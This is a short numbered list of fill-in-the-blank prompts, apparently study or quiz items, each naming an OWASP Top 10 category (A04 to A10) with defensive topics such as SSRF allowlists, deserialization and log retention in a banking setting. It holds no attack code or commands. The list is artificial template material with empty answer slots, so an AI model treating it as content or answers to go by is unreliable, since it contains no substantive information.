4. "A04 Insecure Design step-up auth + threat model STRIDE: ____."
5. "A05 Actuator + default cred + stack trace + security headers: ____."
6. "A06 dependency-check + SBOM + container scan supply chain: ____."
7. "A07 brute force + session fixation + cookie flags banking: ____."
8. "A08 Java deserialization + webhook HMAC + audit hash chain: ____."
9. "A09 SIEM + 5-10 yıl retention + tamper-proof log banking: ____."
10. "A10 SSRF allowlist + private IP block + DNS rebind + IMDSv2: ____."
